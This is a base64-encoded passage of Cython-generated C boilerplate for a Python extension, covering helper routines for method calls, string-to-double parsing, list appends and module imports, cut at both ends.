ZzEsIFB5T2JqZWN0ICphcmcyKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKGNmdW5jLCBzZWxmLCBhcmcxLCBhcmcyKSAgX19QeXhfX0NhbGxVbmJvdW5kQ01ldGhvZDIoY2Z1bmMsIHNlbGYsIGFyZzEsIGFyZzIpCiNlbmRpZgoKCnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKGNvbnN0IGNoYXIqIGZ1bmNfbmFtZSwgaW50IGV4YWN0LAogICAgUHlfc3NpemVfdCBudW1fbWluLCBQeV9zc2l6ZV90IG51bV9tYXgsIFB5X3NzaXplX3QgbnVtX2ZvdW5kKTsKCgojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhvcDEsIG9wMiwgaW50dmFsLCBpbnBsYWNlLCB6ZXJvZGl2aXNpb25fY2hlY2spXAogICAgKGlucGxhY2UgPyBQeU51bWJlcl9JblBsYWNlQWRkKG9wMSwgb3AyKSA6IFB5TnVtYmVyX0FkZChvcDEsIG9wMikpCiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKTsKCgojZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tQkludF9iaW50KHZhbHVlKVwKICAgICgodmFsdWUpID8gX19QeXhfTmV3UmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UcnVlXzIpIDogX19QeXhfTmV3UmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9GYWxzZSkpCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihQeU9iamVjdCogaXRlbSwgUHlPYmplY3QqIHNlcSwgaW50IGVxKSB7CiAgICBpbnQgcmVzdWx0ID0gUHlTZXF1ZW5jZV9Db250YWlucyhzZXEsIGl0ZW0pOwogICAgcmV0dXJuIHVubGlrZWx5KHJlc3VsdCA8IDApID8gcmVzdWx0IDogKHJlc3VsdCA9PSAoZXEgPT0gUHlfRVEpKTsKfQoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfUmFpc2VUb29NYW55VmFsdWVzRXJyb3IoUHlfc3NpemVfdCBleHBlY3RlZCk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoUHlfc3NpemVfdCBpbmRleCk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0l0ZXJGaW5pc2godm9pZCk7CgoKc3RhdGljIGludCBfX1B5eF9JdGVybmV4dFVucGFja0VuZENoZWNrKFB5T2JqZWN0ICpyZXR2YWwsIFB5X3NzaXplX3QgZXhwZWN0ZWQpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeVVuaWNvZGVfQ29udGFpbnNURihQeU9iamVjdCogc3Vic3RyaW5nLCBQeU9iamVjdCogdGV4dCwgaW50IGVxKSB7CiAgICBpbnQgcmVzdWx0ID0gUHlVbmljb2RlX0NvbnRhaW5zKHRleHQsIHN1YnN0cmluZyk7CiAgICByZXR1cm4gdW5saWtlbHkocmVzdWx0IDwgMCkgPyByZXN1bHQgOiAocmVzdWx0ID09IChlcSA9PSBQeV9FUSkpOwp9CgoKc3RhdGljIGRvdWJsZSBfX1B5eF9TbG93UHlTdHJpbmdfQXNEb3VibGUoUHlPYmplY3QgKm9iaik7CnN0YXRpYyBkb3VibGUgX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGUoUHlPYmplY3QgKm9iaiwgY29uc3QgY2hhciogc3RhcnQsIFB5X3NzaXplX3QgbGVuZ3RoKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgZG91YmxlIF9fUHl4X1B5Qnl0ZXNfQXNEb3VibGUoUHlPYmplY3QgKm9iaikgewogICAgY2hhciogYXNfY19zdHJpbmc7CiAgICBQeV9zc2l6ZV90IHNpemU7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICBhc19jX3N0cmluZyA9IFB5Qnl0ZXNfQVNfU1RSSU5HKG9iaik7CiAgICBzaXplID0gUHlCeXRlc19HRVRfU0laRShvYmopOwojZWxzZQogICAgaWYgKFB5Qnl0ZXNfQXNTdHJpbmdBbmRTaXplKG9iaiwgJmFzX2Nfc3RyaW5nLCAmc2l6ZSkgPCAwKSB7CiAgICAgICAgcmV0dXJuIChkb3VibGUpLTE7CiAgICB9CiNlbmRpZgogICAgcmV0dXJuIF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlKG9iaiwgYXNfY19zdHJpbmcsIHNpemUpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGRvdWJsZSBfX1B5eF9QeUJ5dGVBcnJheV9Bc0RvdWJsZShQeU9iamVjdCAqb2JqKSB7CiAgICBjaGFyKiBhc19jX3N0cmluZzsKICAgIFB5X3NzaXplX3Qgc2l6ZTsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgIGFzX2Nfc3RyaW5nID0gUHlCeXRlQXJyYXlfQVNfU1RSSU5HKG9iaik7CiAgICBzaXplID0gUHlCeXRlQXJyYXlfR0VUX1NJWkUob2JqKTsKI2Vsc2UKICAgIGFzX2Nfc3RyaW5nID0gUHlCeXRlQXJyYXlfQXNTdHJpbmcob2JqKTsKICAgIGlmIChhc19jX3N0cmluZyA9PSBOVUxMKSB7CiAgICAgICAgcmV0dXJuIChkb3VibGUpLTE7CiAgICB9CiAgICBzaXplID0gUHlCeXRlQXJyYXlfU2l6ZShvYmopOwojZW5kaWYKICAgIHJldHVybiBfX1B5eF9fUHlCeXRlc19Bc0RvdWJsZShvYmosIGFzX2Nfc3RyaW5nLCBzaXplKTsKfQoKCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKc3RhdGljIGNvbnN0IGNoYXIqIF9fUHl4X19QeVVuaWNvZGVfQXNEb3VibGVfQ29weShjb25zdCB2b2lkKiBkYXRhLCBjb25zdCBpbnQga2luZCwgY2hhciogYnVmZmVyLCBQeV9zc2l6ZV90IHN0YXJ0LCBQeV9zc2l6ZV90IGVuZCkgewogICAgaW50IGxhc3Rfd2FzX3B1bmN0dWF0aW9uOwogICAgUHlfc3NpemVfdCBpOwogICAgbGFzdF93YXNfcHVuY3R1YXRpb24gPSAxOwogICAgZm9yIChpPXN0YXJ0OyBpIDw9IGVuZDsgaSsrKSB7CiAgICAgICAgUHlfVUNTNCBjaHIgPSBQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBpKTsKICAgICAgICBpbnQgaXNfcHVuY3R1YXRpb24gPSAoY2hyID09ICdfJykgfCAoY2hyID09ICcuJyk7CiAgICAgICAgKmJ1ZmZlciA9IChjaGFyKWNocjsKICAgICAgICBidWZmZXIgKz0gKGNociAhPSAnXycpOwogICAgICAgIGlmICh1bmxpa2VseShjaHIgPiAxMjcpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7CiAgICAgICAgaWYgKHVubGlrZWx5KGxhc3Rfd2FzX3B1bmN0dWF0aW9uICYgaXNfcHVuY3R1YXRpb24pKSBnb3RvIHBhcnNlX2ZhaWx1cmU7CiAgICAgICAgbGFzdF93YXNfcHVuY3R1YXRpb24gPSBpc19wdW5jdHVhdGlvbjsKICAgIH0KICAgIGlmICh1bmxpa2VseShsYXN0X3dhc19wdW5jdHVhdGlvbikpIGdvdG8gcGFyc2VfZmFpbHVyZTsKICAgICpidWZmZXIgPSAnXDAnOwogICAgcmV0dXJuIGJ1ZmZlcjsKcGFyc2VfZmFpbHVyZToKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyBkb3VibGUgX19QeXhfX1B5VW5pY29kZV9Bc0RvdWJsZV9pbmZfbmFuKGNvbnN0IHZvaWQqIGRhdGEsIGludCBraW5kLCBQeV9zc2l6ZV90IHN0YXJ0LCBQeV9zc2l6ZV90IGxlbmd0aCkgewogICAgaW50IG1hdGNoZXMgPSAxOwogICAgUHlfVUNTNCBjaHI7CiAgICBQeV9VQ1M0IHNpZ24gPSBQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBzdGFydCk7CiAgICBpbnQgaXNfc2lnbmVkID0gKHNpZ24gPT0gJy0nKSB8IChzaWduID09ICcrJyk7CiAgICBzdGFydCArPSBpc19zaWduZWQ7CiAgICBsZW5ndGggLT0gaXNfc2lnbmVkOwogICAgc3dpdGNoIChQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBzdGFydCkpIHsKICAgICAgICAjaWZkZWYgUHlfTkFOCiAgICAgICAgY2FzZSAnbic6CiAgICAgICAgY2FzZSAnTic6CiAgICAgICAgICAgIGlmICh1bmxpa2VseShsZW5ndGggIT0gMykpIGdvdG8gcGFyc2VfZmFpbHVyZTsKICAgICAgICAgICAgY2hyID0gUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgc3RhcnQrMSk7CiAgICAgICAgICAgIG1hdGNoZXMgJj0gKGNociA9PSAnYScpIHwgKGNociA9PSAnQScpOwogICAgICAgICAgICBjaHIgPSBQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBzdGFydCsyKTsKICAgICAgICAgICAgbWF0Y2hlcyAmPSAoY2hyID09ICduJykgfCAoY2hyID09ICdOJyk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghbWF0Y2hlcykpIGdvdG8gcGFyc2VfZmFpbHVyZTsKICAgICAgICAgICAgcmV0dXJuIChzaWduID09ICctJykgPyAtUHlfTkFOIDogUHlfTkFOOwogICAgICAgICNlbmRpZgogICAgICAgIGNhc2UgJ2knOgogICAgICAgIGNhc2UgJ0knOgogICAgICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoIDwgMykpIGdvdG8gcGFyc2VfZmFpbHVyZTsKICAgICAgICAgICAgY2hyID0gUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgc3RhcnQrMSk7CiAgICAgICAgICAgIG1hdGNoZXMgJj0gKGNociA9PSAnbicpIHwgKGNociA9PSAnTicpOwogICAgICAgICAgICBjaHIgPSBQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBzdGFydCsyKTsKICAgICAgICAgICAgbWF0Y2hlcyAmPSAoY2hyID09ICdmJykgfCAoY2hyID09ICdGJyk7CiAgICAgICAgICAgIGlmIChsaWtlbHkobGVuZ3RoID09IDMgJiYgbWF0Y2hlcykpCiAgICAgICAgICAgICAgICByZXR1cm4gKHNpZ24gPT0gJy0nKSA/IC1QeV9IVUdFX1ZBTCA6IFB5X0hVR0VfVkFMOwogICAgICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoICE9IDgpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7CiAgICAgICAgICAgIGNociA9IFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KzMpOwogICAgICAgICAgICBtYXRjaGVzICY9IChjaHIgPT0gJ2knKSB8IChjaHIgPT0gJ0knKTsKICAgICAgICAgICAgY2hyID0gUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgc3RhcnQrNCk7CiAgICAgICAgICAgIG1hdGNoZXMgJj0gKGNociA9PSAnbicpIHwgKGNociA9PSAnTicpOwogICAgICAgICAgICBjaHIgPSBQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBzdGFydCs1KTsKICAgICAgICAgICAgbWF0Y2hlcyAmPSAoY2hyID09ICdpJykgfCAoY2hyID09ICdJJyk7CiAgICAgICAgICAgIGNociA9IFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KzYpOwogICAgICAgICAgICBtYXRjaGVzICY9IChjaHIgPT0gJ3QnKSB8IChjaHIgPT0gJ1QnKTsKICAgICAgICAgICAgY2hyID0gUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgc3RhcnQrNyk7CiAgICAgICAgICAgIG1hdGNoZXMgJj0gKGNociA9PSAneScpIHwgKGNociA9PSAnWScpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIW1hdGNoZXMpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7CiAgICAgICAgICAgIHJldHVybiAoc2lnbiA9PSAnLScpID8gLVB5X0hVR0VfVkFMIDogUHlfSFVHRV9WQUw7CiAgICAgICAgY2FzZSAnLic6IGNhc2UgJzAnOiBjYXNlICcxJzogY2FzZSAnMic6IGNhc2UgJzMnOiBjYXNlICc0JzogY2FzZSAnNSc6IGNhc2UgJzYnOiBjYXNlICc3JzogY2FzZSAnOCc6IGNhc2UgJzknOgogICAgICAgICAgICBicmVhazsKICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICBnb3RvIHBhcnNlX2ZhaWx1cmU7CiAgICB9CiAgICByZXR1cm4gMC4wOwpwYXJzZV9mYWlsdXJlOgogICAgcmV0dXJuIC0xLjA7Cn0Kc3RhdGljIGRvdWJsZSBfX1B5eF9QeVVuaWNvZGVfQXNEb3VibGVfV2l0aFNwYWNlcyhQeU9iamVjdCAqb2JqKSB7CiAgICBkb3VibGUgdmFsdWU7CiAgICBjb25zdCBjaGFyICpsYXN0OwogICAgY2hhciAqZW5kOwogICAgUHlfc3NpemVfdCBzdGFydCwgbGVuZ3RoID0gUHlVbmljb2RlX0dFVF9MRU5HVEgob2JqKTsKICAgIGNvbnN0IGludCBraW5kID0gUHlVbmljb2RlX0tJTkQob2JqKTsKICAgIGNvbnN0IHZvaWQqIGRhdGEgPSBQeVVuaWNvZGVfREFUQShvYmopOwogICAgc3RhcnQgPSAwOwogICAgd2hpbGUgKFB5X1VOSUNPREVfSVNTUEFDRShQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBzdGFydCkpKQogICAgICAgIHN0YXJ0Kys7CiAgICB3aGlsZSAoc3RhcnQgPCBsZW5ndGggLSAxICYmIFB5X1VOSUNPREVfSVNTUEFDRShQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBsZW5ndGggLSAxKSkpCiAgICAgICAgbGVuZ3RoLS07CiAgICBsZW5ndGggLT0gc3RhcnQ7CiAgICBpZiAodW5saWtlbHkobGVuZ3RoIDw9IDApKSBnb3RvIGZhbGxiYWNrOwogICAgdmFsdWUgPSBfX1B5eF9fUHlVbmljb2RlX0FzRG91YmxlX2luZl9uYW4oZGF0YSwga2luZCwgc3RhcnQsIGxlbmd0aCk7CiAgICBpZiAodW5saWtlbHkodmFsdWUgPT0gLTEuMCkpIGdvdG8gZmFsbGJhY2s7CiAgICBpZiAodmFsdWUgIT0gMC4wKSByZXR1cm4gdmFsdWU7CiAgICBpZiAobGVuZ3RoIDwgNDApIHsKICAgICAgICBjaGFyIG51bWJlcls0MF07CiAgICAgICAgbGFzdCA9IF9fUHl4X19QeVVuaWNvZGVfQXNEb3VibGVfQ29weShkYXRhLCBraW5kLCBudW1iZXIsIHN0YXJ0LCBzdGFydCArIGxlbmd0aCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFsYXN0KSkgZ290byBmYWxsYmFjazsKICAgICAgICB2YWx1ZSA9IFB5T1Nfc3RyaW5nX3RvX2RvdWJsZShudW1iZXIsICZlbmQsIE5VTEwpOwogICAgfSBlbHNlIHsKICAgICAgICBjaGFyICpudW1iZXIgPSAoY2hhciopIFB5TWVtX01hbGxvYygobGVuZ3RoICsgMSkgKiBzaXplb2YoY2hhcikpOwogICAgICAgIGlmICh1bmxpa2VseSghbnVtYmVyKSkgZ290byBmYWxsYmFjazsKICAgICAgICBsYXN0ID0gX19QeXhfX1B5VW5pY29kZV9Bc0RvdWJsZV9Db3B5KGRhdGEsIGtpbmQsIG51bWJlciwgc3RhcnQsIHN0YXJ0ICsgbGVuZ3RoKTsKICAgICAgICBpZiAodW5saWtlbHkoIWxhc3QpKSB7CiAgICAgICAgICAgIFB5TWVtX0ZyZWUobnVtYmVyKTsKICAgICAgICAgICAgZ290byBmYWxsYmFjazsKICAgICAgICB9CiAgICAgICAgdmFsdWUgPSBQeU9TX3N0cmluZ190b19kb3VibGUobnVtYmVyLCAmZW5kLCBOVUxMKTsKICAgICAgICBQeU1lbV9GcmVlKG51bWJlcik7CiAgICB9CiAgICBpZiAobGlrZWx5KGVuZCA9PSBsYXN0KSB8fCAodmFsdWUgPT0gKGRvdWJsZSktMSAmJiBQeUVycl9PY2N1cnJlZCgpKSkgewogICAgICAgIHJldHVybiB2YWx1ZTsKICAgIH0KZmFsbGJhY2s6CiAgICByZXR1cm4gX19QeXhfU2xvd1B5U3RyaW5nX0FzRG91YmxlKG9iaik7Cn0KI2VuZGlmCnN0YXRpYyBDWVRIT05fSU5MSU5FIGRvdWJsZSBfX1B5eF9QeVVuaWNvZGVfQXNEb3VibGUoUHlPYmplY3QgKm9iaikgewojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKG9iaikgPT0gLTEpKQogICAgICAgIHJldHVybiAoZG91YmxlKS0xOwogICAgaWYgKGxpa2VseShQeVVuaWNvZGVfSVNfQVNDSUkob2JqKSkpIHsKICAgICAgICBjb25zdCBjaGFyICpzOwogICAgICAgIFB5X3NzaXplX3QgbGVuZ3RoOwogICAgICAgIHMgPSBQeVVuaWNvZGVfQXNVVEY4QW5kU2l6ZShvYmosICZsZW5ndGgpOwogICAgICAgIHJldHVybiBfX1B5eF9fUHlCeXRlc19Bc0RvdWJsZShvYmosIHMsIGxlbmd0aCk7CiAgICB9CiAgICByZXR1cm4gX19QeXhfUHlVbmljb2RlX0FzRG91YmxlX1dpdGhTcGFjZXMob2JqKTsKI2Vsc2UKICAgIHJldHVybiBfX1B5eF9TbG93UHlTdHJpbmdfQXNEb3VibGUob2JqKTsKI2VuZGlmCn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfX1B5TnVtYmVyX0Zsb2F0KFB5T2JqZWN0KiBvYmopOwojZGVmaW5lIF9fUHl4X1B5TnVtYmVyX0Zsb2F0KHgpIChQeUZsb2F0X0NoZWNrRXhhY3QoeCkgPyBfX1B5eF9OZXdSZWYoeCkgOiBfX1B5eF9fUHlOdW1iZXJfRmxvYXQoeCkpCgoKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBsb25nIGludHZhbCwgaW50IGlucGxhY2UsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spOwojZWxzZQojZGVmaW5lIF9fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhvcDEsIG9wMiwgaW50dmFsLCBpbnBsYWNlLCB6ZXJvZGl2aXNpb25fY2hlY2spXAogICAgKGlucGxhY2UgPyBQeU51bWJlcl9JblBsYWNlVHJ1ZURpdmlkZShvcDEsIG9wMikgOiBQeU51bWJlcl9UcnVlRGl2aWRlKG9wMSwgb3AyKSkKI2VuZGlmCgoKI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9Gb3JtYXQoUHlPYmplY3QqIHMsIFB5T2JqZWN0KiBmKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Gb3JtYXQocywgZikgUHlPYmplY3RfRm9ybWF0KHMsIGYpCiNlbmRpZgoKCiMgaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAjaWYgQ1lUSE9OX1JFRk5BTk5ZCiAgICAgICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShsZWZ0LCByaWdodCkgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2VJbXBsKCZsZWZ0LCByaWdodCwgX19weXhfcmVmbmFubnkpCiAgICAjZWxzZQogICAgICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UobGVmdCwgcmlnaHQpIF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlSW1wbCgmbGVmdCwgcmlnaHQpCiAgICAjZW5kaWYKICAgIHN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZUltcGwoUHlPYmplY3QgKipwX2xlZnQsIFB5T2JqZWN0ICpyaWdodAogICAgICAgICNpZiBDWVRIT05fUkVGTkFOTlkKICAgICAgICAsIHZvaWQqIF9fcHl4X3JlZm5hbm55CiAgICAgICAgI2VuZGlmCiAgICApOwojZWxzZQojZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlIF9fUHl4X1B5VW5pY29kZV9Db25jYXQKI2VuZGlmCiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2VTYWZlKGxlZnQsIHJpZ2h0KSAoKHVubGlrZWx5KChsZWZ0KSA9PSBQeV9Ob25lKSB8fCB1bmxpa2VseSgocmlnaHQpID09IFB5X05vbmUpKSA/XAogICAgUHlOdW1iZXJfSW5QbGFjZUFkZChsZWZ0LCByaWdodCkgOiBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShsZWZ0LCByaWdodCkpCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldFNsaWNlKAogICAgICAgIFB5T2JqZWN0KiBvYmosIFB5X3NzaXplX3QgY3N0YXJ0LCBQeV9zc2l6ZV90IGNzdG9wLAogICAgICAgIFB5T2JqZWN0KiogcHlfc3RhcnQsIFB5T2JqZWN0KiogcHlfc3RvcCwgUHlPYmplY3QqKiBweV9zbGljZSwKICAgICAgICBpbnQgaGFzX2NzdGFydCwgaW50IGhhc19jc3RvcCwgaW50IHdyYXBhcm91bmQpOwoKCiNpZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMaXN0X0FwcGVuZChQeU9iamVjdCogbGlzdCwgUHlPYmplY3QqIHgpIHsKICAgIFB5TGlzdE9iamVjdCogTCA9IChQeUxpc3RPYmplY3QqKSBsaXN0OwogICAgUHlfc3NpemVfdCBsZW4gPSBQeV9TSVpFKGxpc3QpOwogICAgaWYgKGxpa2VseShMLT5hbGxvY2F0ZWQgPiBsZW4pICYgbGlrZWx5KGxlbiA+IChMLT5hbGxvY2F0ZWQgPj4gMSkpKSB7CiAgICAgICAgUHlfSU5DUkVGKHgpOwogICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgICAgIEwtPm9iX2l0ZW1bbGVuXSA9IHg7CiAgICAgICAgI2Vsc2UKICAgICAgICBQeUxpc3RfU0VUX0lURU0obGlzdCwgbGVuLCB4KTsKICAgICAgICAjZW5kaWYKICAgICAgICBfX1B5eF9TRVRfU0laRShsaXN0LCBsZW4gKyAxKTsKICAgICAgICByZXR1cm4gMDsKICAgIH0KICAgIHJldHVybiBQeUxpc3RfQXBwZW5kKGxpc3QsIHgpOwp9CiNlbHNlCiNkZWZpbmUgX19QeXhfUHlMaXN0X0FwcGVuZChMLHgpIFB5TGlzdF9BcHBlbmQoTCx4KQojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbDJBcmdzKFB5T2JqZWN0KiBmdW5jdGlvbiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKTsKCgpzdGF0aWMgaW50IF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZChQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKiptZXRob2QpOwoKCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIG1ldGhvZF9uYW1lLCBQeU9iamVjdCogYXJnKTsKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlPYmplY3RfQXBwZW5kKFB5T2JqZWN0KiBMLCBQeU9iamVjdCogeCk7CgoKI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfR2V0SXRlbShQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqa2V5KTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HZXRJdGVtKG9iaiwga2V5KSAgUHlPYmplY3RfR2V0SXRlbShvYmosIGtleSkKI2VuZGlmCgoKI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMCkKI2RlZmluZSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgYWx3YXlzX2NhbGwsIHZpc2l0LCBhcmcpIDAKI2Vsc2UKc3RhdGljIGludCBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UoUHlPYmplY3QgKm8sIGludCBhbHdheXNfY2FsbCwgdmlzaXRwcm9jIHZpc2l0LCB2b2lkICphcmcpOwojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldFR5cGVEaWN0KFB5VHlwZU9iamVjdCAqdHApOwojZW5kaWYKCgpzdGF0aWMgaW50IF9fUHl4X19TZXRJdGVtT25UeXBlRGljdChQeVR5cGVPYmplY3QgKnRwLCBQeU9iamVjdCAqaywgUHlPYmplY3QgKnYpOwojZGVmaW5lIF9fUHl4X1NldEl0ZW1PblR5cGVEaWN0KHRwLCBrLCB2KSBfX1B5eF9fU2V0SXRlbU9uVHlwZURpY3QoKFB5VHlwZU9iamVjdCopdHAsIGssIHYpCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoUHlUeXBlX1NwZWMgKnNwZWMsIFB5VHlwZU9iamVjdCAqdHlwZSk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZyhQeU9iamVjdCAqZnVuYyk7CgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUpOwoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKc3RhdGljIGludCBfX1B5eF92YWxpZGF0ZV9iYXNlc190dXBsZShjb25zdCBjaGFyICp0eXBlX25hbWUsIFB5X3NzaXplX3QgZGljdG9mZnNldCwgUHlPYmplY3QgKmJhc2VzKTsKI2VuZGlmCgoKQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1B5VHlwZV9SZWFkeShQeVR5cGVPYmplY3QgKnQpOwoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0KFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqZnJvbV9saXN0LCBpbnQgbGV2ZWwpOwoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpOwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZV9XYWxrUGFydHMoUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSk7CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeUxpc3RfUGFjayhQeV9zc2l6ZV90IG4sIC4uLik7CgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9JbXBvcnRGc